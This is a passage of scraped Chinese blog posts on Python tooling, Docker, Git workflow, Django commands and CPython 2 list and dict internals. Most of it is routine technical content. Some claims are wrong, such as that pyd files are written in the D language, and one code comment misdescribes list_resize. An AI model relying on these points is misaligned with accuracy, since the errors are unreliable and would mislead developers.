pyenv作者为pyenv写的一个插件，通过该插件可以让你方便的同时使用pyenv和virtualenv。另外，如果你使用的是python3.3及以上的版本，它会尝试使用venv而不是virtualenv。当然，其实你也可以自己配置同时使用pyenv和virtualenv，而不直接使用pyenv-virtualenv。\n1.4 virtualenvwrapper virtualenvwrapper 是virtualenv的一些列扩展，它提供了诸如 mkvirtualenv, lssitepackages 等命令行工具，特别是 workon 命令行工具，当你需要使用多个virtualenv目录时使用该工具特别方便。\n1.5 pyenv-virtualenvwrapper pyenv-virtualenvwrapper pyenv作者为pyenv写的另外一个插件，可方便集成virtualenvwrapper到pyenv。\n1.6 pipenv pipenv, requests 库的作者 Kenneth Reitz 编写的一个工具，目标是合并 Pipfile、pip、virtualenv 到同一个命令行工具中，实际使用中类似nodejs的依赖包管理工具npm。\n2. 标准库 2.1 pyvenv pyvenv 是python3自带的的一个标准工具，但是在python3.6中已经弃用，取而代之的是 venv (python3 -m venv)。\n2.2 venv venv 是 python3 自带的命令行工具，可以通过运行 python3 -m venv 启动。另外在某些发行版中，venv需要额外安装，比如Ubuntu需要安装 python3-venv。venv和virtualenv很接近，主要差别是不需要单独copy python可执行文件到相应目录。如果你不需要支持python2，那么你可以直接使用venv。不过到目前为止，python社区仍然更偏向于使用virtuanenv。\n3. 来源 http://www.vincentsfootprint.com/post/venv_virtualenv_pipenv_difference ","description":"","id":460,"section":"post","tags":["整理","Python","工具","环境"],"title":"Python 下各种环境隔离工具简介","uri":"https://www.chenshaowen.com/blog/introduction-of-various-environmental-isolating-tools-under-python.html"},{"content":"1. 关于个人项目 为什么强调是个人项目？商业项目对代码托管、开发、运维部署等环节有着冗长的流程。而对于个人开发者，这样的流程成本过高，不利于快速项目迭代。\n个人项目可能是一次学习的 Demo。完成一个领域 Demo 是很好的技术学习思路。从零开始搭建一个完整的 Demo， 不仅能了解到一些常见的领域问题，还能够对领域有一个完整的了解。既见树木，又见树林。\n个人项目也有可能是为了满足一个小的需求。比如，你需要一个在线相册，而公共相册又不能任意的按照自己的想法展示，也不承诺永久服务。这样就产生了一个需求。你可以自己开发在线相册，也可以在开源项目的基础上修改，总之有了一个小需求。\n无论何种出发点，个人项目都应该被鼓励。个人项目是程序员的试验场，也是程序员展示自己的地方，既能够提高自己的能力，也能够取悦自己。\n2. 使用 GitHub 开源自己的项目 你要记住的是，你的代码远没有你想象的那么重要。\n绝大多数的程序员只是在模仿或者搬运他人的成果，具有开创性贡献的程序员极少。这里并不是在贬低模仿或者搬运，对于商业来讲，代码的核心是与业务逻辑相关的实现，并不需要特殊的技巧。而对于个人项目，摆脱了业务逻辑的束缚，开源对我们不仅没有害处，还有诸多好处。\n监督代码质量。毕竟是需要对外开源的项目，代码肯定被自己 Review 很多次。\n交流项目合作开发。全世界的程序员都在 GitHub，用 issues 提交自己的问题，通过 PR 多人开发。\n增加影响力。你的Demo、小需求，其他人也会需要，在分享给其他人的同时，你也获得了其他人的赞许，收获影响力。\n3. 使用 Docker 容器化项目 Docker 简直是喜欢折腾服务器者的福音。\n在没有 Docker 之前，服务器总是被弄得乱糟糟，安装各种服务软件、运行环境，没过多久服务器磁盘就不够用了。有了 Docker 之后，你可以在隔离的运行环境去完成自己的各种尝试。\nDocker 通过 lxc、cgroup、namespace 等技术在宿主机上虚拟出运行时，提供支持秒级启停的虚拟机服务。相对于 VirtualBox、VMWare 等虚拟机，Docker 更轻量级，对资源利用率更高效。\n使用 Docker 容器化一个项目也只有三步：\n需要合适的基础镜像\n挂载目录\n暴露服务端口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 需要合适的基础镜像 FROM node:6 RUN mkdir -p /var/www/app WORKDIR /var/www/app # 挂载目录 ADD . /var/www/app RUN rm -rf /var/www/app/resources/photos/* /var/www/app/config.js # 暴露服务端口 EXPOSE 3000 RUN npm install -g cnpm --registry=https://registry.npm.taobao.org \u0026amp;\u0026amp; return 0 RUN cnpm install CMD [\u0026#34;cnpm\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;start\u0026#34;] 上面是我为最近 Docker 化的一个应用，编写的 Dockerfile 文件。为了加快依赖包安装时间，使用了 cnpm。\n4. 使用 hub.docker.com 发布镜像 通过 GitHub 托管代码的好处是可以方便地使用各种各样周边的服务。比如，用于持续集成的 Travis CI 。这里想提的是 hub.docker.com 提供的镜像编译功能。\n在 hub.docker.com 注册账号之后，创建项目关联上 GitHub 的项目。每次向 GitHub 推送代码之后，就会触发 hub.docker.com 的编译镜像任务。同时，编译完成的镜像也可以被其他人所使用。\n5. 使用 GitLab 私有仓库托管部署脚本 对于一些私人信息的配置，放在 GitLab 是一个不错的选择。GitHub 免费账号只能创建公开项目，而 GitLab 免费账户也可以创建私人项目。\n将项目配置、部署脚本托管在 GitLab 私有仓库，既保证了隐私，也记录了配置和脚本的变更。\n再加上 GitLab CI，GitLab 真的是越用越喜欢。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 version: \u0026#39;2\u0026#39; services: nginx: image: shaowenchen/docker-nginx:latest restart: always privileged: true links: - gallery volumes: - ./www/:/var/www/ ports: - \u0026#34;80:80\u0026#34; depends_on: - gallery gallery: image: shaowenchen/zing-gallery:latest restart: always volumes: - ./www/resources/photos:/var/www/app/resources/photos - ./www/conf/config.js:/var/www/app/config.js 上面是我最近利用 docker-compose 编排的一个服务。只需要一个 docker-compose.yml 文件，加上一些配置文件，在任意一台服务器上，都可以使用一条命令 docker-compose up -d 将服务跑起来。\n6. 将服务监控起来 有两种方式监控服务：\n第一种是通过日志。通过部署 ELK 可以很好的记录运行和访问日志，针对日志关键字可以开发相关的监控告警系统。\n第二种是监控系统。通过部署 Prometheus、Bosun 可以对服务进行有效地监控。\n如果嫌麻烦，还有一种更加方面的途径，使用 DaoCloud。安装 DaoCloud 的 Agent ，将主机托管在 DaoCloud 之后，就可以实时地查看和部署服务，了解服务器的运行状况了。\n","description":"","id":461,"section":"post","tags":["博文","Docker","Git"],"title":"如何使用 Docker 开发个人项目","uri":"https://www.chenshaowen.com/blog/how-to-use-docker-to-help-individual-projects.html"},{"content":" 最近参与了一个多人协作开发的项目，在开发过程中遇到不少问题。例如，前端提交冲掉后端代码、代码冲突无法解决直接返工、A 提交 B 分支、直接提交 Master 分支等。本文是记录，也是思考如何更高质量地管理项目、进行多人合作项目的开发。\n1. 版本管理的需求 1.1 版本标记 在正式环境，每一次发布之前都需要对版本进行标记。一方面是为了记录发布历史，另一方面是为了在必要时，能够迅速地回滚版本。比如，在 3 月 21 日 进行了一次正式环境的发布，Tag: V20180321，Message：新增 XXXX。在 3 月 29 日，运营人员要求立即下线一个跳转的链接。但是在距离上一次正式发布的时间段内，开发人员已经提交了新的功能代码，甚至可能已经合并到主仓库。这时，开发人员可以拉取 Tag: V20180321 版本的代码，修改之后再打上 Tag: V20180321-remove-xxx，即可进行测试、发布。\n1.2 分支管理 在多人开发时，为了减少开发人员之间的相互干扰，强烈建议每个人都以功能的维度创建分支更新代码，一个功能一个分支。在项目排期分配的过程中，通常会将不同的功能、模块，划分给不同的人。在这种情况下，只需要提前约定模块之前耦合的部分，比如，接口、全局变量等，就能够满足协作开发的初衷：多人并行、缩短开发周期。\n1.3 变更记录 对文件变更的记录是版本管理最基本的需求。变更记录是最原始的迭代数据，通过查阅变更记录，可以将功能和具体的代码行结合起来，既方便审计代码，也是给其他开发者的注释。\n2. 为什么是 Git， 而不是 SVN 分支管理上的优势，让我们选择了 Git，放弃 SVN。\nGit 上可以轻松地使用多个独立分支。同时很容易对这些分支进行创建、更新、删除、合并等操作。\n另外一点是，Git 速度快，从各种压力测试数据来看，相较于 SVN，Git 在文件压缩、文件存储方面有着极高的效率。\n3. Git 开发工作流 简单介绍一下项目开发团队背景：开发人员包括，三个前端、两个后端；项目 S 是一个 SaaS 项目，基于 PaaS 平台开发，平台提供 SVN 仓库进行代码管理。前端使用 Webpack + Vue.js，后端使用 Django，采用前后端分离的模式进行开发。\nS 项目是一个在频繁迭代的项目，这一次是第五期。前面几期，主要有一个前端、一个后端配合开发。第五期，由于前端离职，两个前端新人+前端导师加入项目组。两个后端也有其他项目，并非 100 % 投入。\n这种情况下，前端不熟悉项目、后端不能全身心投入。如果不采取一定的措施，势必导致项目延期，甚至污染早期的代码。\n于是在新迭代伊始，我就将仓库迁移到 Git。同时，使用GitLab CI 将代码推送到 SVN 发布仓库，以更好地支持多人协作开发。\n考虑到项目迭代周期短，我选择的是 Github Flow 的工作模式。下面是开发工作流：\n以功能划分单元，每个功能新建一个分支，最终合并到 Master 分支。由于小的功能点特别多，频繁的创建分支，会导致分支太多；如果删除分支，又无法追溯版本。于是，约定在这一期迭代中，每个人持续跟踪一个自己的分支。在每次开发新功能之前，需要将 Master 合并到自己的分支，以保持本地版本最新。\n4. MR/PR 流程 多人合作开发主要是通过多分支来实施。多分支管理的难点在分支的合并上。听过公司内部一个敏捷开发方向的专家分享，在他带领的团队出现过，合并代码比开发代码时间还长的情况。然后，通过解耦、优化流程，结合 CI 工具，最终每两个星期就能发一个版本，再结合 A/B 发布，能达到每周一个版本，快速迭代的奇效。\n简单点讲，Github Flow 就是将每次新功能、BUG 修改等都新建一个分支。提交代码之后，发起一个 Merge Request（简称，MR）、或者 Pull Request （简称，PR）。再由项目其他成员讨论之后，反复修改、提交代码。最终达成一致之后，由具有 Merge 权限的成员合并到 Master 分支。\n其中的 MR/PR 流程是保证模块正确耦合、高质量代码的关键。出现前端代码冲掉后端代码、冲突无法解决直接返工等问题的原因，正是因为 MR/PR 流程的缺失。\n于是，前后端都指定了一位负责人，具有 Master 权限，负责 Review 其他成员的代码，处理其他成员发起的 MR/PR。其他成员作为 Developer 的角色存在于项目。Review 代码是一种能快速学习、提高代码质量的方式，如果项目内部能形成相互 Review 的习惯，对项目和自己都会有很大收益。\n5. 参考 http://gitbeijing.com/github_flow.html ","description":"","id":462,"section":"post","tags":["博文","效率","合作","CI","DevOps"],"title":"基于 Git 的前后端开发工作流","uri":"https://www.chenshaowen.com/blog/based-on-git-development-workflow-of-front-and-back.html"},{"content":"创建 Django 工程 1 django-admin startproject your_project_name 创建应用 1 2 3 django-admin.py startapp your_app_name # 或者 python manage.py startapp your_app_name python manage.py 和 django-admin 的功能基本一样。不同的是 python manage.py 还设置了 DJANGO_SETTINGS_MODULE 环境变量、将项目的路径加入了 sys.path 中。建议除了创建项目使用 django-admin，其他情况使用 python manage.py。\n初始化数据 1 python manage.py migrate 创建缓存表 1 2 python manage.py createcachetable [cache_table_name] # 默认表名 django_cache 清除全部数据 1 python manage.py flush --noinput 在指定端口启动服务 1 python manage.py runserver 0.0.0.0:8000 启动 celery 的后台任务 1 python manage.py celery worker --settings=settings -l info -c 4 --autoreload 启动 celery 的周期任务 1 python manage.py celery beat 安装项目的依赖包 1 pip install -r requirements.txt 关闭全部 Python 进程 1 2 taskkill -f -im python taskkill -f -im python.exe 关闭全部 uwsgi 进程 1 ps aux|grep uwsgi|awk \u0026#39;{print $2}\u0026#39;|xargs kill -9 使用 uwsgi 启动 Django 1 uwsgi --ini uwsgi.ini ","description":"","id":463,"section":"post","tags":["博文","Python","Django","命令"],"title":"Django 开发中常用命令","uri":"https://www.chenshaowen.com/blog/common-commands-in-django-development.html"},{"content":"1. 为什么字典比列表查询快 首先，请看下面这段代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 from time import time t = time() data = [chr(i) for i in range(97, 123)] # data = dict.fromkeys(data,True) print data for i in range(9999999): after_filter = [] for find in [\u0026#39;aa\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;cc\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;ee\u0026#39;]: if find not in data: after_filter.append(find) print after_filter print time() - t 直接运行：\n['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'] ['aa', 'cc', 'ee'] 24.5699999332 去掉注释 data = dict.fromkeys(data,True) 后：\n{'a': True, 'c': True, 'b': True, 'e': True, 'd': True, 'g': True, 'f': True, 'i': True, 'h': True, 'k': True, 'j': True, 'm': True, 'l': True, 'o': True, 'n': True, 'q': True, 'p': True, 's': True, 'r': True, 'u': True, 't': True, 'w': True, 'v': True, 'y': True, 'x': True, 'z': True} ['aa', 'cc', 'ee'] 17.8080000877 反复测试多次，结果不会偏差超过 1 秒。为什么将列表通过 dict.fromkeys 函数转换为字典之后，运行速度会明显加快呢？\nPython 字典中使用了 hash table，因此查找操作的复杂度为 O(1)，而 list 实际是个数组，在 list 中，查找需要遍历整个 list，其复杂度为 O(n)，因此对成员的查找访问等操作字典要比 list 更快。下面，我们一起来看下 Python 源码中列表和字典结构是如何实现的？\n2. Python 源码中的常见对象 Python 中的对象都继承自 PyObject 或 PyVarObject。继承自 PyObject 的对象长度固定，比如 int 等。继承自 PyVarObject 的对象长度可变，比如 list、dict等。而 PyObject 和 PyVarObject 拥有相同的头部 PyObject_HEAD。\nPyObject_HEAD 定义于 include/object.h 中\n1 2 3 4 #define PyObject_HEAD \\ _PyObject_HEAD_EXTRA \\ Py_ssize_t ob_refcnt; \\ struct _typeobject *ob_type; _PyObject_HEAD_EXTRA 是双向链表结构，用于垃圾回收。ob_refcnt 是对象的引用计数，当没有被引用时，自动回收内存。ob_type 是指向类型对象的指针，决定了对象的类型。\nPyObject 定义于 include/object.h 中\n1 2 3 typedef struct _object { PyObject_HEAD } PyObject; PyVarObject 定义于 include/object.h 中\n1 2 3 4 5 6 7 #define PyObject_VAR_HEAD \\ PyObject_HEAD \\ Py_ssize_t ob_size; // 可变部分的元素数量 typedef struct { PyObject_VAR_HEAD } PyVarObject; PyVarObject 包含一组对象，数量由 ob_size 指定。\n3. Python 中列表的实现 定义 include/listobject.h\n1 2 3 4 5 6 7 #define PyList_MAXFREELIST 80 typedef struct { PyObject_VAR_HEAD // 表示变长对象，其中的 ob_size 表示实际使用的内存大小 PyObject **ob_item; // 列表元素所在内存块的首地址 Py_ssize_t allocated; // 列表总共分配的内存数量 } PyListObject; 内置函数 Objects/listobject.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 static PyMethodDef list_methods[] = { {\u0026#34;__getitem__\u0026#34;, (PyCFunction)list_subscript, METH_O|METH_COEXIST, getitem_doc}, {\u0026#34;__reversed__\u0026#34;,(PyCFunction)list_reversed, METH_NOARGS, reversed_doc}, {\u0026#34;__sizeof__\u0026#34;, (PyCFunction)list_sizeof, METH_NOARGS, sizeof_doc}, {\u0026#34;append\u0026#34;, (PyCFunction)listappend, METH_O, append_doc}, {\u0026#34;insert\u0026#34;, (PyCFunction)listinsert, METH_VARARGS, insert_doc}, {\u0026#34;extend\u0026#34;, (PyCFunction)listextend, METH_O, extend_doc}, {\u0026#34;pop\u0026#34;, (PyCFunction)listpop, METH_VARARGS, pop_doc}, {\u0026#34;remove\u0026#34;, (PyCFunction)listremove, METH_O, remove_doc}, {\u0026#34;index\u0026#34;, (PyCFunction)listindex, METH_VARARGS, index_doc}, {\u0026#34;count\u0026#34;, (PyCFunction)listcount, METH_O, count_doc}, {\u0026#34;reverse\u0026#34;, (PyCFunction)listreverse, METH_NOARGS, reverse_doc}, {\u0026#34;sort\u0026#34;, (PyCFunction)listsort, METH_VARARGS | METH_KEYWORDS, sort_doc}, {NULL, NULL} /* sentinel */ }; 在定义列表的文件中，定义了 Python 中 list 内置方法对应的 C 函数。下面简单看下这些函数的实现逻辑。\n初始化 Objects/listobject.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 PyList_New(Py_ssize_t size) { ... // 如果缓冲池非空, 从缓冲池取 if (numfree) { numfree--; op = free_list[numfree]; _Py_NewReference((PyObject *)op); ... } else { // 否则, 申请新的内存空间 op = PyObject_GC_New(PyListObject, \u0026amp;PyList_Type); ... } if (size \u0026lt;= 0) op-\u0026gt;ob_item = NULL; else { ... // 初始化 memset(op-\u0026gt;ob_item, 0, nbytes); } ... } append 调用逻辑：listappend -\u0026gt; app1 -\u0026gt;list_resize +1 后，PyList_SET_ITEM\ninclude/listobject.h\n1 #define PyList_SET_ITEM(op, i, v) (((PyListObject *)(op))-\u0026gt;ob_item[i] = (v)) Objects/listobject.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 static int list_resize(PyListObject *self, Py_ssize_t newsize) { PyObject **items; size_t new_allocated; Py_ssize_t allocated = self-\u0026gt;allocated; // 如果内存大小够用，并且新内存大小超过之前的一半，则需要分配新内存 if (allocated \u0026gt;= newsize \u0026amp;\u0026amp; newsize \u0026gt;= (allocated \u0026gt;\u0026gt; 1)) { assert(self-\u0026gt;ob_item != NULL || newsize == 0); Py_SIZE(self) = newsize; return 0; } //否则分配新的内存空间 new_allocated = (newsize \u0026gt;\u0026gt; 3) + (newsize \u0026lt; 9 ? 3 : 6); ... } list_resize() 会多申请一些空间以避免频繁地内存操作，增长趋势是：0，4， 8，16，25，35，46，58，72，88, …实际上在分配内存是调用的是 C 语言的 realloc 方法。\ninsert 调用逻辑：listinsert-\u0026gt; ins1-\u0026gt;list_resize +1 ，移动元素后插入新数据。\nObjects/listobject.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 static int ins1(PyListObject *self, Py_ssize_t where, PyObject *v) { ... if (list_resize(self, n+1) == -1) return -1; // 如果插入位置为负数，则加上列表长度一次，如果依然为负数，则插在首位 if (where \u0026lt; 0) { where += n; if (where \u0026lt; 0) where = 0; } // 如果插入位置超过列表长度，则插在列表末尾处 if (where \u0026gt; n) where = n; items = self-\u0026gt;ob_item; // 向后移动元素，再插入新的数据 for (i = n; --i \u0026gt;= where; ) items[i+1] = items[i]; Py_INCREF(v); items[where] = v; return 0; } 其他方法这里就不一一列举了。\n4. Python 中字典的实现 Python 中的字典是通过哈希表实现的。哈希表是一个数组，它的索引是对键运用哈希函数求得的，采用开放地址法解决冲突问题。\n定义 Include/dictobject.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 typedef struct { Py_ssize_t me_hash; //用于缓存 me_key 的哈希值，避免每次查询都需要计算 hash PyObject *me_key; PyObject *me_value; } PyDictEntry; typedef struct _dictobject PyDictObject; struct _dictobject { PyObject_HEAD Py_ssize_t ma_fill; //表示所有激活元素（active entry）和虚拟元素（dummy entry）的计数。 Py_ssize_t ma_used; //所有激活元素的计数 Py_ssize_t ma_mask; //哈希表的位掩码，这个表中包含 ma_mask + 1 个哈希槽(slot)。 PyDictEntry *ma_table; //PyDictEntry 结构体的数组， PyDictEntry 包含 key 对象、value 对象，以及 key 的哈希； PyDictEntry *(*ma_lookup)(PyDictObject *mp, PyObject *key, long hash);//用于查找 key 的函数指针 PyDictEntry ma_smalltable[PyDict_MINSIZE]; //最小有 8 个槽的哈希表 }; 上面是 字典 Key 值状态转换图。如果删除一个 key，这个元素将被设置为 dummy，并不是真的删除。dummy 状态的元素在插入新的元素之后，变为激活状态。\n基本函数 Objects/dictobject.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 static PyMethodDef mapp_methods[] = { ... sizeof__doc__}, {\u0026#34;has_key\u0026#34;, (PyCFunction)dict_has_key, METH_O, has_key__doc__}, {\u0026#34;get\u0026#34;, (PyCFunction)dict_get, METH_VARARGS, get__doc__}, {\u0026#34;setdefault\u0026#34;, (PyCFunction)dict_setdefault, METH_VARARGS, setdefault_doc__}, {\u0026#34;pop\u0026#34;, (PyCFunction)dict_pop, METH_VARARGS, pop__doc__}, {\u0026#34;popitem\u0026#34;, (PyCFunction)dict_popitem, METH_NOARGS, popitem__doc__}, {\u0026#34;keys\u0026#34;, (PyCFunction)dict_keys, METH_NOARGS, keys__doc__}, {\u0026#34;items\u0026#34;, (PyCFunction)dict_items, METH_NOARGS, items__doc__}, {\u0026#34;values\u0026#34;, (PyCFunction)dict_values, METH_NOARGS, values__doc__}, {\u0026#34;viewkeys\u0026#34;, (PyCFunction)dictkeys_new, METH_NOARGS, viewkeys__doc__}, {\u0026#34;viewitems\u0026#34;, (PyCFunction)dictitems_new, METH_NOARGS, viewitems__doc__}, {\u0026#34;viewvalues\u0026#34;, (PyCFunction)dictvalues_new, METH_NOARGS, viewvalues__doc__}, {\u0026#34;update\u0026#34;, (PyCFunction)dict_update, METH_VARARGS | METH_KEYWORDS, update__doc__}, {\u0026#34;fromkeys\u0026#34;, (PyCFunction)dict_fromkeys, METH_VARARGS | METH_CLASS, fromkeys__doc__}, {\u0026#34;clear\u0026#34;, (PyCFunction)dict_clear, METH_NOARGS, clear__doc__}, {\u0026#34;copy\u0026#34;, (PyCFunction)dict_copy, METH_NOARGS, copy__doc__}, {\u0026#34;iterkeys\u0026#34;, (PyCFunction)dict_iterkeys, METH_NOARGS, iterkeys__doc__}, {\u0026#34;itervalues\u0026#34;, (PyCFunction)dict_itervalues, METH_NOARGS, itervalues__doc__}, {\u0026#34;iteritems\u0026#34;, (PyCFunction)dict_iteritems, METH_NOARGS, iteritems__doc__}, {NULL, NULL} /* sentinel */ }; 初始化 Objects/dictobject.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 PyObject * PyDict_New(void) { register PyDictObject *mp; // 初始化dummy if (dummy == NULL) { /* Auto-initialize dummy */ dummy = PyString_FromString(\u0026#34;\u0026lt;dummy key\u0026gt;\u0026#34;); if (dummy == NULL) return NULL; } ... // 如果缓冲池可用，取最后一个可用对象，并将其清空、初始化。 if (numfree) { mp = free_list[--numfree]; assert (mp != NULL); assert (Py_TYPE(mp) == \u0026amp;PyDict_Type); _Py_NewReference((PyObject *)mp); if (mp-\u0026gt;ma_fill) { EMPTY_TO_MINSIZE(mp); } else { /* At least set ma_table and ma_mask; these are wrong if an empty but presized dict is added to freelist */ INIT_NONZERO_DICT_SLOTS(mp); } ... } else { // 否则，申请新的内存对象 mp = PyObject_GC_New(PyDictObject, \u0026amp;PyDict_Type); if (mp == NULL) return NULL; ... } // 设置搜索方法 mp-\u0026gt;ma_lookup = lookdict_string; ... return (PyObject *)mp; } 这里说明一下，字典对象的缓冲池free_list， 是一个长度为 80 的数组。\nget 调用逻辑：dict_get -\u0026gt; lookdict_string -\u0026gt; lookdict，返回查询到的值\nObjects/dictobject.c\n1 2 3 4 5 6 7 8 9 10 static PyObject * dict_get(register PyDictObject *mp, PyObject *args) { ... ep = (mp-\u0026gt;ma_lookup)(mp, key, hash); ... val = ep-\u0026gt;me_value; ... return val; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 static PyDictEntry * lookdict(PyDictObject *mp, PyObject *key, register long hash) { ... register PyDictEntry *freeslot; register size_t mask = (size_t)mp-\u0026gt;ma_mask; // 掩码等于数组长度 - 1 ... // 计算所在 entry 位置. i = (size_t)hash \u0026amp; mask; ep = \u0026amp;ep0[i]; // 如果找到，则返回 entry if (ep-\u0026gt;me_key == NULL || ep-\u0026gt;me_key == key) return ep; // 如果是 dummy，赋值给 freeslot，freeslot 用来指向探测序列中第一个处于dummy 态的 entry。如果搜索失败，则返回 freeslot，其指向的 enery -\u0026gt;me_value 为 NULL if (ep-\u0026gt;me_key == dummy) freeslot = ep; else { // 搜索成功 if (ep-\u0026gt;me_hash == hash) { startkey = ep-\u0026gt;me_key; Py_INCREF(startkey); cmp = PyObject_RichCompareBool(startkey, key, Py_EQ); Py_DECREF(startkey); if (cmp \u0026lt; 0) return NULL; if (ep0 == mp-\u0026gt;ma_table \u0026amp;\u0026amp; ep-\u0026gt;me_key == startkey) { if (cmp \u0026gt; 0) return ep; } else { /* The compare did major nasty stuff to the * dict: start over. * XXX A clever adversary could prevent this * XXX from terminating. */ return lookdict(mp, key, hash); } } freeslot = NULL; } // 冲突时，二次探测 for (perturb = hash; ; perturb \u0026gt;\u0026gt;= PERTURB_SHIFT) { i = (i \u0026lt;\u0026lt; 2) + i + perturb + 1; ep = \u0026amp;ep0[i \u0026amp; mask]; if (ep-\u0026gt;me_key == NULL) return freeslot == NULL ? ep : freeslot; if (ep-\u0026gt;me_key == key) return ep; if (ep-\u0026gt;me_hash == hash \u0026amp;\u0026amp; ep-\u0026gt;me_key != dummy) { ... } else if (ep-\u0026gt;me_key == dummy \u0026amp;\u0026amp; freeslot == NULL) freeslot = ep; } ... } 5. 参考 http://www.cnblogs.com/ybjourney/p/6171870.html http://woodrat.xyz/2017/07/30/CPython%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%282%29/ https://docs.python.org/2/extending/newtypes.html ","description":"","id":464,"section":"post","tags":["博文","Python","源码"],"title":"Python2 源码学习之字典和列表实现","uri":"https://www.chenshaowen.com/blog/dictionary-and-list-structure-in-python2.html"},{"content":"1. Python 2 和 3 区别 特征\\版本| Python 2| Python 3\n| :-: | -:\nprint 函数化 | print“abc”| print(\u0026ldquo;abc\u0026rdquo;)\n统一类| 旧式类和新式类| 只有新式类\n浮点运算| 1/2=0| 1/2=0.5\n字符串格式化| %,Format| Format,%\nxrange 替代 range| xrange| range\nlong 重命名为 int| Long,int| Int\n包导入| 相对导入| 绝对导入\n源文件编码| Ascii| utf8 Python 官方强烈建议直接学习 Python 3，因为 Python 2 只维护到 2020 年。但是现阶段（2018 年），大量生产环境依然是 Python 2，建议先学 Python 2。同时， Python 2.7 和 Python 3 的差异不超过 10%，在 Python 2 中的 __future__ 库里面包含了大量 Python 3 的特性。\n在实践中建议：\n熟悉 __future__ 库 尽量使用 Python 2 与 Python 3 兼容的语法 了解 Python 3 弃用的语法和包， 不要使有 Python 3.5 之前的 Python 3.x 版本 2. 参考 https://docs.python.org/3/whatsnew/3.0.html ","description":"","id":465,"section":"post","tags":["整理","Python","比较"],"title":"Python2 VS Python3","uri":"https://www.chenshaowen.com/blog/python2-vs-python3.html"},{"content":"1. 编译器准备 准备 Python 源码\n在 Python 的官网，下载需要进行编译的 Python 版本源代码。这里选择的是 Python 2 的最新版本 Python-2.7.14.tar.xz，点击前往。\n准备编译器\n在 Windows 上，Python 2.7 的源代码内置的项目工程，支持 Visual Studio 2008、2010 打开。当然，VS 2013 也能够编译，在导入项目时，选择升级 VC++编译器和库即可。这里使用的是，VS2013_RTM_PRO_CHS，点击下载。\n2. 源代码的目录结构 Demo：Demo 用的代码，主要用来展示 Python 的一些应用 Doc：Python 的 UserManual，Latex 格式 Grammar：语法文件。这个语法文件会在 Python 运行的时候被用来分析Python 源代码 include：Python Include 用的头文件 Lib：Python 的库文件 Mac：For Mac Misc：如字面意思，一些不适合放在其他地方的文件就放在这里了 Modules：Python 的一些 Built-in Module 的实现 Objects：Python 的基本内部对象的实现，比如 class/list 等等 Parser：Python 的词法分析和语法分析 PC：比较老的 Windows 和 OS2 的 Port 的项目以及 Port 用到的一些公用文件放在这里，PCBuild 和 PCBuild8 都要用到这个目录的内容 PCBuild：Python 用于 Visual Studio 2008/2010 的 Project 文件 Python：Python 主程序代码 RISCOS：Python 的 RISC OS Port Tools：Build 和 Extend Python 所需的工具 3. 编译步骤 第一步，解压 Python-2.7.14\n第二步，进入 PCbuild文件夹，使用 VS2013 打开 pcbuild.sln\n第三步，编译运行。最终会在 PCbuild 文件夹下生成 python_d.exe 和 python27_d.dll 文件，可双击 python_d.exe，进入 python 命令行环境。\n4. Python 的总体架构 在图左边是， Python 提供的大量的模块，库以及用户自定义的模块。比如在执行 import os 时，这个 os 就是 Python 内建的模块，当然用户还可以通过自定义模块来扩展 Python 的模块。\n在图中间的是，Python 的核心，解释器（interpreter）。Scanner 对应词法分析，将文件输入的 Python 源代码或从命令行输入的一行行 Python 代码切分为一个一个的 token；Parse r对应语法分析部分，在 Scanner 的分析结果上进行语法分析，建立抽象语法树（AST）；Compiler 是根据建立的AST生成指令集合，Python字节码（byte code），就像Java编译器和C#编译器所做的那样；最后由 Code Evaluator 来解释并执行这些字节码。因此，Code Evaluator 又可以被称为执行引擎。\n在图右边是，Python的运行时环境，包括对象/类型系统(Object/Type structures)，内存分配器（Memory Allocator）和运行时状态（Current State of Python）。运行时状态维护了解释器在执行字节码时，在不同的状态之间切换的动作，可以将它视为一个巨大而复杂的有穷状态机。内存分配器则全权负责 Python 中创建对象时对内存的申请工作，实际上它就是 Python 运行时与C中 malloc 的一层接口。而对象/类型系统则包含了 Python 中存在的各种内建对象，比如整数、list 和 dict 等。\n5. 参考 《Python源码剖析》 ","description":"","id":466,"section":"post","tags":["博文","Python","源码","Windows"],"title":"Python2 源码学习之 Windows 编译","uri":"https://www.chenshaowen.com/blog/compiling-python2-source-code-under-windows.html"},{"content":" 文中以 Python 2.7.8 版本源码为例。\n1. Python 中常见的文件格式 py 文件 Python 源代码文件，可以使用文本编辑器进行修改。\npyc 文件 Python 源代码编译后，生成的字节码文件。\npyw 文件 pyc 文件执行时，会出现 console 窗口；pyw 文件执行时，不会出现。pyw 文件主要是用来运行纯 GUI 图形用户界面程序，运行时，需要 Pythonw 解释执行。\npyo 文件 Python 源代码优化编译后的文件。 执行命令，python -O your.py， 即可将 Python 源代码编译为 pyo 文件\npyd 文件 一般是其他语言编写的 Python 扩展模块。pyd 文件是用 D 语言（C/C++综合进化版本）编写，编译生成的二进制文件。\n2. py 生成 pyc 文件 如果对代码目录具有写的权限，在两种情况下，py 源代码文件会编译生成 pyc 文件：\n被 import 的模块，会生成 pyc 文件。 被 py_compile 编译的 Python 代码会生成 